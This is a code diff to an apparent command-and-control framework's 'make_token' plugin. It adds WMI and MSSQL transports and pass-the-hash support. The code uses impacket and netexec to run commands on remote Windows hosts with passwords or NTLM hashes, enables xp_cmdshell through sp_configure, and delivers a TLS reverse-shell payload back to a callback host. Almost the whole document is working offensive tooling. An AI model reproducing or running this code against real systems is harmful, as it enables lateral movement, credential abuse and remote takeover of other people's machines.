+            host_spec = f"{host}:{port}" if (port is not None and port != self.DEFAULT_PORTS['rdp']) else host
             cmd = [
                 self._xfreerdp_command,
                 '/v:' + host_spec,
@@ -648,35 +784,90 @@ class RDPTransport(RemoteTransport):
         except Exception as e:
             raise RemoteTransportError(f"xfreerdp connection failed: {e}")
 
+    def _execute_xfreerdp_command(self, command: str, background: bool = False) -> Tuple[bool, str]:
+        if not self._xfreerdp_command:
+            return False, "xfreerdp not available"
+        if not self._password:
+            return False, "xfreerdp requires password (NTLM hash not supported)"
+        if self._ntlm_hash:
+            return False, "xfreerdp does not support NTLM hash authentication"
+        if self._target_os != 'windows':
+            return False, "xfreerdp command execution is only supported for Windows targets"
+
+        cmd = [
+            self._xfreerdp_command,
+            '/v:' + self._host,
+            '/u:' + self._username,
+            '/p:' + self._password,
+            '/cert-ignore',
+            '/timeout:10000',
+            '/network:lan',
+            '/gfx-h264:off',
+            '/gdi:sw',
+            '/app:cmd.exe',
+            '/app-cmd:' + f'/c {command}',
+            '/exit-after-disconnect',
+        ]
+        if self._port is not None and self._port != self.DEFAULT_PORTS['rdp']:
+            cmd.append('/port:' + str(self._port))
+
+        timeout = 10 if background else 60
+        success, stdout, stderr = self._run_command(cmd, timeout=timeout)
+
+        if success:
+            return True, stdout
+        else:
+            error_lower = (stdout + stderr).lower()
+            if 'could not open display' in error_lower:
+                return False, "xfreerdp requires X11 display. Use --nxc flag for headless environments"
+            elif 'failed to connect' in error_lower:
+                return False, f"xfreerdp connection failed: {stderr.strip()}"
+            else:
+                return False, f"xfreerdp command execution failed: {stderr.strip() or stdout.strip()}"
+
     def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                         background: bool = False) -> Tuple[bool, str]:
         if not self.connected:
             return False, "Not connected"
-        if not self._netexec_available:
-            return False, "netexec required for RDP command execution"
+
         target_os = target_os or self._target_os or 'windows'
         if isinstance(command, dict):
             command = self._get_os_specific_command(command, target_os)
             if command is None:
                 return False, f"No command found for OS: {target_os}"
-        try:
-            cmd = [
-                'netexec', 'rdp', self._host,
-                '-u', self._username,
-                '-p', self._password,
-            ]
-            if target_os == 'windows':
-                cmd.extend(['-x', command])
-            else:
-                cmd.extend(['-X', command])
-            timeout = 10 if background else 60
-            success, stdout, stderr = self._run_command(cmd, timeout=timeout)
-            if success:
-                return True, stdout
-            else:
-                return False, stderr
-        except Exception as e:
-            return False, str(e)
+
+        if self._netexec_available and self._use_nxc:
+            try:
+                cmd = ['netexec', 'rdp', self._host, '-u', self._username]
+                if self._ntlm_hash:
+                    cmd.extend(['-H', self._ntlm_hash])
+                elif self._password:
+                    cmd.extend(['-p', self._password])
+                else:
+                    return False, "No authentication available for netexec RDP"
+
+                if self._port is not None and self._port != self.DEFAULT_PORTS['rdp']:
+                    cmd.extend(['--port', str(self._port)])
+
+                if target_os == 'windows':
+                    cmd.extend(['-x', command])
+                else:
+                    cmd.extend(['-X', command])
+
+                timeout = 10 if background else 60
+                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
+
+                if success:
+                    return True, stdout
+                else:
+                    if 'unrecognized arguments' in stderr or 'invalid option' in stderr:
+                        self._netexec_available = False
+                    else:
+                        return False, stderr
+            except Exception:
+                pass
+
+        return self._execute_xfreerdp_command(command, background)
 
     def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
         return self.execute_command(payload, target_os, background=True)
@@ -684,10 +875,436 @@ class RDPTransport(RemoteTransport):
     def close(self):
         self.connected = False
         self._host = self._username = self._password = self._target_os = None
+        self._port = None
+        self._ntlm_hash = None
 
     def _perform_platform_detection(self) -> str:
         return "windows"
 
+class WMITransport(RemoteTransport):
+    """WMI transport using wmiexec.py (impacket) or netexec/nxc."""
+    
+    def __init__(self):
+        super().__init__()
+        self._wmiexec_cmd = None
+        self._nxc_cmd = None
+        self._netexec_available = False
+
+    def _ensure_dependency(self):
+        if self._check_command('wmiexec.py'):
+            self._wmiexec_cmd = 'wmiexec.py'
+        elif self._check_command('impacket-wmiexec'):
+            self._wmiexec_cmd = 'impacket-wmiexec'
+        else:
+            self._wmiexec_cmd = None
+
+        if self._check_command('nxc'):
+            self._nxc_cmd = 'nxc'
+        elif self._check_command('netexec'):
+            self._nxc_cmd = 'netexec'
+        else:
+            self._nxc_cmd = None
+        self._netexec_available = self._nxc_cmd is not None
+
+        if not (self._wmiexec_cmd or self._netexec_available):
+            raise RemoteTransportError(
+                "WMI requires either 'wmiexec.py' (or 'impacket-wmiexec') from impacket, or 'nxc'/'netexec'. "
+                "Install impacket: pip install impacket, or netexec: pip install netexec"
+            )
+
+    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
+        self._ensure_dependency()
+        if kwargs.get('private_key'):
+            raise RemoteTransportError("WMI does not support private key authentication")
+        ntlm_hash = kwargs.get('ntlm_hash')
+        use_nxc = kwargs.get('use_nxc', False)
+        port = kwargs.get('port')
+        target_os = kwargs.get('target_os', 'windows')
+        callback_host = kwargs.get('callback_host')
+        callback_port = kwargs.get('callback_port')
+
+        if not password and not ntlm_hash:
+            raise RemoteTransportError("Password or NTLM hash required for WMI")
+
+        if target_os != 'windows':
+            raise RemoteTransportError("WMI only supports Windows targets")
+
+        self._host = host
+        self._username = username
+        self._password = password
+        self._ntlm_hash = ntlm_hash
+        self._target_os = target_os
+        self._callback_host = callback_host
+        self._callback_port = callback_port
+        self._port = port
+        self._use_nxc = use_nxc
+
+        if self._use_nxc:
+            if not self._netexec_available:
+                raise RemoteTransportError("netexec/nxc not available for WMI")
+            return self._connect_nxc(host, username, password, ntlm_hash, port)
+        else:
+            if not self._wmiexec_cmd:
+                raise RemoteTransportError("No wmiexec command found (tried wmiexec.py and impacket-wmiexec)")
+            return self._connect_wmiexec(host, username, password, ntlm_hash, port)
+
+    def _connect_wmiexec(self, host: str, username: str, password: Optional[str] = None,
+                         ntlm_hash: Optional[str] = None, port: Optional[int] = None) -> bool:
+        host_spec = f"{host}:{port}" if port else host
+        try:
+            if password:
+                cmd = [self._wmiexec_cmd, f'{username}:{password}@{host_spec}', 'cmd.exe', '/c', 'exit']
+            elif ntlm_hash:
+                cmd = [self._wmiexec_cmd, f'{username}@{host_spec}', '-hashes', f':{ntlm_hash}', 'cmd.exe', '/c', 'exit']
+            else:
+                raise RemoteTransportError("Password or NTLM hash required")
+            success, stdout, stderr = self._run_command(cmd, timeout=30)
+            if success:
+                self.connected = True
+                return True
+            else:
+                raise RemoteTransportError(f"{self._wmiexec_cmd} connection failed: {stderr.strip()}")
+        except RemoteTransportError:
+            raise
+        except Exception as e:
+            raise RemoteTransportError(f"{self._wmiexec_cmd} connection failed: {e}")
+
+    def _connect_nxc(self, host: str, username: str, password: Optional[str] = None,
+                     ntlm_hash: Optional[str] = None, port: Optional[int] = None) -> bool:
+        try:
+            cmd = [self._nxc_cmd, 'wmi', host, '-u', username]
+            if port:
+                cmd.extend(['--port', str(port)])
+            if ntlm_hash:
+                cmd.extend(['-H', ntlm_hash])
+            elif password:
+                cmd.extend(['-p', password])
+            else:
+                raise RemoteTransportError("Password or NTLM hash required")
+            cmd.extend(['-x', 'exit'])
+            success, stdout, stderr = self._run_command(cmd, timeout=30)
+            output = stdout + stderr
+            if success or 'authenticated' in output.lower():
+                self.connected = True
+                return True
+            else:
+                raise RemoteTransportError(f"{self._nxc_cmd} WMI connection failed: {stderr.strip()}")
+        except RemoteTransportError:
+            raise
+        except Exception as e:
+            raise RemoteTransportError(f"{self._nxc_cmd} WMI connection failed: {e}")
+
+    def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
+                        background: bool = False) -> Tuple[bool, str]:
+        if not self.connected:
+            return False, "Not connected"
+        target_os = target_os or self._target_os or 'windows'
+        if target_os != 'windows':
+            return False, "WMI only supports Windows targets"
+        if isinstance(command, dict):
+            command = self._get_os_specific_command(command, target_os)
+            if command is None:
+                return False, f"No command found for OS: {target_os}"
+
+        if self._use_nxc:
+            try:
+                cmd = [self._nxc_cmd, 'wmi', self._host, '-u', self._username]
+                if self._ntlm_hash:
+                    cmd.extend(['-H', self._ntlm_hash])
+                elif self._password:
+                    cmd.extend(['-p', self._password])
+                else:
+                    return False, "No authentication available"
+                if self._port:
+                    cmd.extend(['--port', str(self._port)])
+                cmd.extend(['-x', command])
+                timeout = 10 if background else 60
+                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
+                if success:
+                    return True, stdout
+                else:
+                    return False, stderr
+            except Exception as e:
+                return False, str(e)
+        else:
+            if not self._wmiexec_cmd:
+                return False, "No wmiexec command available"
+            host_spec = f"{self._host}:{self._port}" if self._port else self._host
+            try:
+                if self._password:
+                    cmd = [self._wmiexec_cmd, f'{self._username}:{self._password}@{host_spec}', command]
+                elif self._ntlm_hash:
+                    cmd = [self._wmiexec_cmd, f'{self._username}@{host_spec}', '-hashes', f':{self._ntlm_hash}', command]
+                else:
+                    return False, "No authentication available"
+                timeout = 10 if background else 60
+                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
+                if success:
+                    return True, stdout
+                else:
+                    return False, stderr
+            except Exception as e:
+                return False, str(e)
+
+    def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
+        return self.execute_command(payload, target_os, background=True)
+
+    def close(self):
+        self.connected = False
+        self._host = self._username = self._password = self._target_os = None
+        self._port = None
+        self._ntlm_hash = None
+
+    def _perform_platform_detection(self) -> str:
+        return "windows"
+
+class MSSQLTransport(RemoteTransport):
+    """MSSQL transport using mssqlclient.py (impacket) or netexec/nxc.
+    
+    In netexec mode, we first try to enable xp_cmdshell using the built‑in
+    'enable_cmdshell' module. If that fails, we fall back to the manual SQL
+    approach (sp_configure).
+    """
+    
+    def __init__(self):
+        super().__init__()
+        self._mssqlclient_cmd = None
+        self._nxc_cmd = None
+        self._netexec_available = False
+        self._xp_cmdshell_enabled = False
+
+    def _ensure_dependency(self):
+        if self._check_command('mssqlclient.py'):
+            self._mssqlclient_cmd = 'mssqlclient.py'
+        elif self._check_command('impacket-mssqlclient'):
+            self._mssqlclient_cmd = 'impacket-mssqlclient'
+        else:
+            self._mssqlclient_cmd = None
+
+        if self._check_command('nxc'):
+            self._nxc_cmd = 'nxc'
+        elif self._check_command('netexec'):
+            self._nxc_cmd = 'netexec'
+        else:
+            self._nxc_cmd = None
+        self._netexec_available = self._nxc_cmd is not None
+
+        if not (self._mssqlclient_cmd or self._netexec_available):
+            raise RemoteTransportError(
+                "MSSQL requires either 'mssqlclient.py' (or 'impacket-mssqlclient') from impacket, or 'nxc'/'netexec'. "
+                "Install impacket: pip install impacket, or netexec: pip install netexec"
+            )
+
+    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
+        self._ensure_dependency()
+        if kwargs.get('private_key'):
+            raise RemoteTransportError("MSSQL does not support private key authentication")
+        ntlm_hash = kwargs.get('ntlm_hash')
+        use_nxc = kwargs.get('use_nxc', False)
+        port = kwargs.get('port', 1433)
+        target_os = kwargs.get('target_os', 'windows')
+        callback_host = kwargs.get('callback_host')
+        callback_port = kwargs.get('callback_port')
+
+        if not password and not ntlm_hash:
+            raise RemoteTransportError("Password or NTLM hash required for MSSQL")
+
+        self._host = host
+        self._username = username
+        self._password = password
+        self._ntlm_hash = ntlm_hash
+        self._target_os = target_os
+        self._callback_host = callback_host
+        self._callback_port = callback_port
+        self._port = port
+        self._use_nxc = use_nxc
+
+        if self._use_nxc:
+            if not self._netexec_available:
+                raise RemoteTransportError("netexec/nxc not available for MSSQL")
+            return self._connect_nxc(host, username, password, ntlm_hash, port)
+        else:
+            if not self._mssqlclient_cmd:
+                raise RemoteTransportError("No mssqlclient command found (tried mssqlclient.py and impacket-mssqlclient)")
+            return self._connect_mssqlclient(host, username, password, ntlm_hash, port)
+
+    def _connect_mssqlclient(self, host: str, username: str, password: Optional[str] = None,
+                             ntlm_hash: Optional[str] = None, port: Optional[int] = None) -> bool:
+        host_spec = f"{host}:{port}" if port else host
+        query = "SELECT 1"
+        try:
+            if password:
+                cmd = [self._mssqlclient_cmd, f'{username}:{password}@{host_spec}', '-query', query]
+            elif ntlm_hash:
+                cmd = [self._mssqlclient_cmd, f'{username}@{host_spec}', '-hashes', f':{ntlm_hash}', '-query', query]
+            else:
+                raise RemoteTransportError("Password or NTLM hash required")
+            success, stdout, stderr = self._run_command(cmd, timeout=30)
+            if success and '1' in stdout:
+                self.connected = True
+                return True
+            else:
+                raise RemoteTransportError(f"{self._mssqlclient_cmd} connection failed: {stderr.strip()}")
+        except RemoteTransportError:
+            raise
+        except Exception as e:
+            raise RemoteTransportError(f"{self._mssqlclient_cmd} connection failed: {e}")
+
+    def _connect_nxc(self, host: str, username: str, password: Optional[str] = None,
+                     ntlm_hash: Optional[str] = None, port: Optional[int] = None) -> bool:
+        try:
+            cmd = [self._nxc_cmd, 'mssql', host, '-u', username]
+            if port:
+                cmd.extend(['--port', str(port)])
+            if ntlm_hash:
+                cmd.extend(['-H', ntlm_hash])
+            elif password:
+                cmd.extend(['-p', password])
+            else:
+                raise RemoteTransportError("Password or NTLM hash required")
+            cmd.extend(['-q', 'SELECT 1'])
+            success, stdout, stderr = self._run_command(cmd, timeout=30)
+            output = stdout + stderr
+            if success or 'authenticated' in output.lower():
+                self.connected = True
+                return True
+            else:
+                raise RemoteTransportError(f"{self._nxc_cmd} MSSQL connection failed: {stderr.strip()}")
+        except RemoteTransportError:
+            raise
+        except Exception as e:
+            raise RemoteTransportError(f"{self._nxc_cmd} MSSQL connection failed: {e}")
+
+    def _enable_xp_cmdshell_with_module(self) -> bool:
+        """Try to enable xp_cmdshell using netexec's enable_cmdshell module."""
+        cmd = [self._nxc_cmd, 'mssql', self._host, '-u', self._username]
+        if self._ntlm_hash:
+            cmd.extend(['-H', self._ntlm_hash])
+        elif self._password:
+            cmd.extend(['-p', self._password])
+        else:
+            return False
+        if self._port:
+            cmd.extend(['--port', str(self._port)])
+        cmd.extend(['-M', 'enable_cmdshell', '-o', 'ACTION=enable'])
+        success, stdout, stderr = self._run_command(cmd, timeout=30)
+        if success:
+            verify_cmd = [self._nxc_cmd, 'mssql', self._host, '-u', self._username]
+            if self._ntlm_hash:
+                verify_cmd.extend(['-H', self._ntlm_hash])
+            elif self._password:
+                verify_cmd.extend(['-p', self._password])
+            if self._port:
+                verify_cmd.extend(['--port', str(self._port)])
+            verify_cmd.extend(['-q', "EXEC xp_cmdshell 'echo 1'"])
+            v_success, v_stdout, _ = self._run_command(verify_cmd, timeout=15)
+            if v_success and '1' in v_stdout:
+                return True
+        return False
+
+    def _enable_xp_cmdshell_manual(self) -> bool:
+        """Enable xp_cmdshell using manual SQL commands (fallback)."""
+        check_sql = "IF EXISTS (SELECT 1 FROM sys.configurations WHERE name='xp_cmdshell' AND value=1) SELECT 1 ELSE SELECT 0"
+        success, output = self._execute_sql(check_sql)
+        if success and '1' in output:
+            return True
+        enable_sql = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
+        success, output = self._execute_sql(enable_sql)
+        return success
+
+    def _enable_xp_cmdshell(self) -> bool:
+        """Try module first, then fallback to manual SQL."""
+        if self._xp_cmdshell_enabled:
+            return True
+        if self._use_nxc and self._netexec_available:
+            if self._enable_xp_cmdshell_with_module():
+                self._xp_cmdshell_enabled = True
+                return True
+        if self._enable_xp_cmdshell_manual():
+            self._xp_cmdshell_enabled = True
+            return True
+        return False
+
+    def _execute_sql(self, sql: str) -> Tuple[bool, str]:
+        """Execute arbitrary SQL query using the current transport."""
+        if self._use_nxc:
+            cmd = [self._nxc_cmd, 'mssql', self._host, '-u', self._username]
+            if self._ntlm_hash:
+                cmd.extend(['-H', self._ntlm_hash])
+            elif self._password:
+                cmd.extend(['-p', self._password])
+            else:
+                return False, "No authentication"
+            if self._port:
+                cmd.extend(['--port', str(self._port)])
+            cmd.extend(['-q', sql])
+            success, stdout, stderr = self._run_command(cmd, timeout=60)
+            return success, stdout if success else stderr
+        else:
+            if not self._mssqlclient_cmd:
+                return False, "No mssqlclient available"
+            host_spec = f"{self._host}:{self._port}" if self._port else self._host
+            if self._password:
+                cmd = [self._mssqlclient_cmd, f'{self._username}:{self._password}@{host_spec}', '-query', sql]
+            elif self._ntlm_hash:
+                cmd = [self._mssqlclient_cmd, f'{self._username}@{host_spec}', '-hashes', f':{self._ntlm_hash}', '-query', sql]
+            else:
+                return False, "No authentication"
+            success, stdout, stderr = self._run_command(cmd, timeout=60)
+            return success, stdout if success else stderr
+
+    def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
+                        background: bool = False) -> Tuple[bool, str]:
+        if not self.connected:
+            return False, "Not connected"
+
+        target_os = target_os or self._target_os or 'windows'
+        if target_os != 'windows':
+            return False, "MSSQL command execution via xp_cmdshell is only supported on Windows targets"
+
+        if isinstance(command, dict):
+            command = self._get_os_specific_command(command, target_os)
+            if command is None:
+                return False, f"No command found for OS: {target_os}"
+
+        if not self._enable_xp_cmdshell():
+            return False, "Failed to enable xp_cmdshell"
+
+        if self._use_nxc:
+            sql = f"EXEC xp_cmdshell '{command}'"
+            return self._execute_sql(sql)
+        else:
+            if not self._mssqlclient_cmd:
+                return False, "No mssqlclient available"
+            host_spec = f"{self._host}:{self._port}" if self._port else self._host
+            try:
+                if self._password:
+                    cmd = [self._mssqlclient_cmd, f'{self._username}:{self._password}@{host_spec}', '-x', command]
+                elif self._ntlm_hash:
+                    cmd = [self._mssqlclient_cmd, f'{self._username}@{host_spec}', '-hashes', f':{self._ntlm_hash}', '-x', command]
+                else:
+                    return False, "No authentication"
+                timeout = 10 if background else 60
+                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
+                if success:
+                    return True, stdout
+                else:
+                    return False, stderr
+            except Exception as e:
+                return False, str(e)
+
+    def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
+        return self.execute_command(payload, target_os, background=True)
+
+    def close(self):
+        self.connected = False
+        self._host = self._username = self._password = self._target_os = None
+        self._port = None
+        self._ntlm_hash = None
+        self._xp_cmdshell_enabled = False
+
+    def _perform_platform_detection(self) -> str:
+        return "windows"
 
 def get_transport(protocol: str) -> RemoteTransport:
     transports = {
@@ -695,6 +1312,8 @@ def get_transport(protocol: str) -> RemoteTransport:
         'winrm': WinRMTransport,
         'smb': SMBTransport,
         'rdp': RDPTransport,
+        'wmi': WMITransport,
+        'mssql': MSSQLTransport,
     }
     if protocol.lower() not in transports:
         raise RemoteTransportError(f"Unsupported protocol: {protocol}")
@@ -717,7 +1336,7 @@ def parse_make_token_args(args: list) -> Dict[str, Any]:
         description='Make token - establish C2 session via remote protocol and deliver reverse shell payload (TLS)'
     )
     parser.add_argument('-x', '--protocol', required=True,
-                        choices=['ssh', 'winrm', 'smb', 'rdp'],
+                        choices=['ssh', 'winrm', 'smb', 'rdp', 'wmi', 'mssql'],
                         help='Remote protocol to use')
     parser.add_argument('--os', required=True,
                         choices=['windows', 'linux', 'macos'],
@@ -727,7 +1346,7 @@ def parse_make_token_args(args: list) -> Dict[str, Any]:
     parser.add_argument('-u', '--username', required=True, help='Username for authentication')
     parser.add_argument('-p', '--password', help='Password for authentication')
     parser.add_argument('-c', '--key', help='SSH private key path (SSH only)')
-    parser.add_argument('-H', '--hash', help='NTLM hash for authentication (SMB/RDP only)')
+    parser.add_argument('-H', '--hash', help='NTLM hash for authentication (SMB/RDP/WinRM)')
     parser.add_argument('--nxc', action='store_true', help='Use netexec tool instead of native protocol tools')
     parser.add_argument('-rh', '--callback-host', required=True,
                         help='Reverse shell listener host (TLS)')
@@ -740,13 +1359,11 @@ def parse_make_token_args(args: list) -> Dict[str, Any]:
         if parsed.port and (parsed.port < 1 or parsed.port > 65535):
             raise RemoteTransportError("Port must be between 1 and 65535")
 
-        # Validate protocol-OS compatibility
         if not validate_protocol_compatibility(parsed.protocol, parsed.os):
             raise RemoteTransportError(
                 f"{parsed.protocol.upper()} is not compatible with {parsed.os} target"
             )
 
-        # Protocol-specific validation
         if parsed.protocol == 'ssh':
             if not parsed.password and not parsed.key:
                 raise RemoteTransportError("SSH requires either -p (password) or -c (key)")
@@ -756,13 +1373,10 @@ def parse_make_token_args(args: list) -> Dict[str, Any]:
         elif parsed.protocol == 'winrm':
             if parsed.key:
                 raise RemoteTransportError("WinRM does not support private key")
-            if parsed.hash:
-                raise RemoteTransportError("WinRM does not support NTLM hash")
-            if not parsed.password:
-                raise RemoteTransportError("WinRM requires -p (password)")
+            if not parsed.password and not parsed.hash:
+                raise RemoteTransportError("WinRM requires either -p (password) or -H (hash)")
             if parsed.os != 'windows':
                 raise RemoteTransportError("WinRM only supports Windows targets")
-            parsed.nxc = True  # WinRM always uses netexec
 
         elif parsed.protocol == 'smb':
             if parsed.key:
@@ -775,6 +1389,22 @@ def parse_make_token_args(args: list) -> Dict[str, Any]:
                 raise RemoteTransportError("RDP does not support private key")
             if not parsed.password and not parsed.hash:
                 raise RemoteTransportError("RDP requires either -p (password) or -H (hash)")
+
+        elif parsed.protocol == 'wmi':
+            if parsed.key:
+                raise RemoteTransportError("WMI does not support private key")
+            if not parsed.password and not parsed.hash:
+                raise RemoteTransportError("WMI requires either -p (password) or -H (hash)")
+            if parsed.os != 'windows':
+                raise RemoteTransportError("WMI only supports Windows targets")
+
+        elif parsed.protocol == 'mssql':
+            if parsed.key:
+                raise RemoteTransportError("MSSQL does not support private key")
+            if not parsed.password and not parsed.hash:
+                raise RemoteTransportError("MSSQL requires either -p (password) or -H (hash)")
+            if parsed.os != 'windows':
+                raise RemoteTransportError("MSSQL with xp_cmdshell only supports Windows targets")
 
         return {
             'protocol': parsed.protocol,
@@ -845,20 +1475,22 @@ def run(session: SessionContext, args):
     callback_host = params['callback_host']
     callback_port = params['callback_port']
 
-    # Build tool info
     tool_info = ""
     if use_nxc:
         tool_info = " using netexec (nxc)"
     elif protocol == 'ssh':
         tool_info = " using ssh"
     elif protocol == 'winrm':
-        tool_info = " using netexec (nxc)"
+        tool_info = " using default WinRM tool (evil-winrm or netexec)"
     elif protocol == 'smb':
         tool_info = " using netexec/impacket"
     elif protocol == 'rdp':
         tool_info = " using netexec/xfreerdp"
+    elif protocol == 'wmi':
+        tool_info = " using netexec/impacket-wmiexec"
+    elif protocol == 'mssql':
+        tool_info = " using netexec/impacket-mssqlclient"
 
-    # Get transport
     try:
         transport = get_transport(protocol)
     except RemoteTransportError as e:
@@ -866,7 +1498,6 @@ def run(session: SessionContext, args):
         session.log_plugin_result('make_token', '', str(e))
         return 1
 
-    # Attempt connection
     try:
         auth_method = "password" if password else ("SSH key" if key else "NTLM hash" if ntlm_hash else "unknown")
         session.print(f"Connecting to {ip} via {protocol.upper()}{tool_info}...", 'yellow')
@@ -904,7 +1535,6 @@ def run(session: SessionContext, args):
         transport.close()
         return 1
 
-    # Detect platform
     try:
         detected_platform = transport.detect_platform()
         if detected_platform != "unknown":
@@ -927,7 +1557,6 @@ def run(session: SessionContext, args):
         session.log_plugin_result('make_token', format_make_token_report(result), str(e))
         return 1
 
-    # Validate protocol compatibility with actual platform
     if not validate_protocol_compatibility(protocol, target_platform):
         transport.close()
         error_msg = f"{protocol.upper()} is not compatible with {target_platform} target"
@@ -945,7 +1574,6 @@ def run(session: SessionContext, args):
         session.log_plugin_result('make_token', format_make_token_report(result), error_msg)
         return 1
 
-    # Generate and deliver the payload (which runs in background)
     session.print(f"Generating reverse shell payload for {target_platform} (TLS to {callback_host}:{callback_port})...", 'yellow')
     try:
         payload = transport._generate_payload(target_platform, callback_host, callback_port)
@@ -965,6 +1593,8 @@ def run(session: SessionContext, args):
             }
             if use_nxc:
                 result['tool'] = 'netexec (nxc)'
+            elif protocol == 'winrm' and not use_nxc:
+                result['tool'] = 'evil-winrm' if transport._evil_winrm_available else 'netexec'
             if ntlm_hash:
                 result['auth_method'] = 'NTLM hash'
             elif key:
